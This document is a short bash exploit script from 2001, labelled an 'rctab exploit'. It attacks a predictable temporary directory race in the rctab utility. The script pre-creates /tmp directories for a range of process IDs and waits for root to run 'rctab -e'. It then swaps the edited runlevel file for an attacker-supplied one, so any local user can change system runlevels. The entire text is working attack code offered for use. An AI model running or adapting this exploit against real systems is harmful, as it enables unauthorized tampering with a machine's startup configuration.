#!/bin/bash
#       any user can force changes to runlevels
#       by IhaQueR

declare -i PLOW
declare -i PHIGH


# CONFIG:

PLOW=1
PHIGH=3

TMP="/tmp"
FAKERC="/tmp/fakerc"
RCTMPDIR="rctmpdir"
RCTMP="rctmp"

_pwd="$PWD"

#
echo "----------------------------------------------"
echo "|                                            |"
echo "|             rctab exploit                  |"
echo "|            by IhaQueR '2001                |"
echo "|                                            |"
echo "----------------------------------------------"
echo

# crate dirs
echo "[+] now creating directories"
echo "    this may take a while"
echo

declare -i cnt
cnt=$PLOW
umask 700

while [ $cnt -lt $PHIGH ]
do
        cnt=$(($cnt+1))
        if [ $(($cnt % 128)) -eq 0 ] ; then
                printf "[%6d] " $cnt
        fi;
        if [ $(($cnt % 1024)) -eq 0 ] ; then
                echo
        fi;
        mkdir -p "$TMP/$RCTMPDIR.$cnt"
done

echo
echo
echo "    finished creating dirs"
echo

# wait for rctab -e
declare -i rctabpid
rctabpid=0
echo "[+] waiting for root to run rctab"

while [ 1 ]
do
        rctabpid=`ps aux|grep "rctab -e"|grep root|head -n1|awk '{print $2}'`
        if test $rctabpid -gt 1 ; then
                break
        fi
        sleep 1
done

# rcfile in
rcfile="/tmp/rctmpdir.$rctabpid/$RCTMP"

echo "[+] got rctab -e at pid $rctabpid"

# test if we own the directory
rcdir="/tmp/rctmpdir.$rctabpid"

if test -O $rcdir ; then
        echo "[+] ok, we own the dir"
else
        echo "[-] hm, we are not owner"
        exit 2
fi

# wait for root to finish editing
sleep 4
declare -i vipid
vipid=`ps aux|grep rctmpdir|grep root|awk '{print $2}'`

echo "    root is editing now at $vipid, wait for $rcfile"

pfile="/proc/$vipid"

while test -d $pfile
do
        echo -n >/dev/null
done
rm -rf $rcfile
cp $FAKERC $rcfile

echo "[+] gotcha!"
echo "    installed new rctab from $FAKERC"

